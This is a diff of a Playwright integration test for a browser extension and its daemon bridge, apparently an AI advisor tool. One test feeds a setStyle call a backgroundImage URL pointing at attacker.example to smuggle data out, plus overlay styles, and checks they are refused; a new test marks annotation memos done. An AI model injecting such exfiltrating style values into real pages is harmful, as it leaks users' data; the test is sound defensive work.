@@ -197,7 +197,7 @@ test.describe('Milestone 2 Integration', () => {
     expect(res.results[1]).toMatchObject({ ok: false, held: true });
     expect(await page.evaluate(() => window.__bought === true)).toBe(false);
 
-    // setStyle は見た目を直す範囲だけ。外部参照(読んだ値の持ち出し口)と、要素を重ねる/隠すプロパティは断る。
+    // setStyle は見た目を直す範囲だけ。外部参照(読んだ値の持ち出し口)と、要素を重ねる・動かす・透過させるプロパティは断る。
     const styles = await run([
       { verb: 'setStyle', args: { selector: '#buy-now', styles: { backgroundImage: 'url(https://attacker.example/?d=1)' } } },
       { verb: 'setStyle', args: { selector: '#buy-now', styles: { position: 'fixed', zIndex: '9999' } } },
@@ -207,6 +207,41 @@ test.describe('Milestone 2 Integration', () => {
     expect(styles.results.map((r) => r.ok)).toEqual([false, false, false, false]);
     expect(await page.$eval('#buy-now', (el) => [el.style.backgroundImage, el.style.position, el.style.opacity, el.style.marginTop])).toEqual(['', '', '', '']);
 
+    await page.close();
+  });
+
+  test('a3. resolve_feedback relay marks the memos done in the open tab and in storage', async () => {
+    await expect.poll(() => daemonWss.getBridgeStatus().connected).toBe(true);
+    const sw = await getServiceWorker(context);
+    const anchor = { selector: 'input[name="email"]', tag: 'input', role: 'textbox', text: '' };
+    await sw.evaluate(
+      async ({ scope, anchor }) => {
+        await chrome.storage.local.set({
+          aiAdvisorAnnotations: {
+            [scope]: [{ id: 'note-open', kind: 'note', createdAt: '2026-10-17T00:00:00Z', note: '枠を太く', intent: '', anchor }],
+            'http://127.0.0.1:1/closed': [{ id: 'note-closed', kind: 'note', createdAt: '2026-10-17T00:00:00Z', note: '閉じたページ', intent: '', anchor }],
+          },
+        });
+      },
+      { scope: pageUrl.split('?')[0], anchor },
+    );
+    const page = await context.newPage();
+    await page.goto(pageUrl);
+    await expect(page.locator('.bag-step-caption')).toHaveCount(1);
+    const tabId = await sw.evaluate(async (u) => (await chrome.tabs.query({})).find((t) => t.url === u)?.id, pageUrl);
+
+    const res = await daemonWss.request('mark_annotations_done', { tabId, ids: ['note-open', 'note-closed'] });
+    expect(res.marked.sort()).toEqual(['note-closed', 'note-open']);
+    await expect(page.locator('.bag-step-caption--done')).toContainText('AI');
+    const stored = await sw.evaluate(async () => (await chrome.storage.local.get('aiAdvisorAnnotations')).aiAdvisorAnnotations);
+    const all = Object.values(stored).flat();
+    for (const id of ['note-open', 'note-closed']) {
+      expect(all.find((a) => a.id === id)).toMatchObject({ forAI: false, doneAt: expect.any(String) });
+    }
+    // 該当メモを持たない拡張は ok:false を返す(複数の拡張が繋がる時に、持つ側の応答を daemon に採らせる)。
+    await expect(daemonWss.request('mark_annotations_done', { tabId, ids: ['missing'] })).rejects.toThrow(/No matching annotations/);
+
+    await sw.evaluate(() => chrome.storage.local.remove('aiAdvisorAnnotations'));
     await page.close();
   });
 
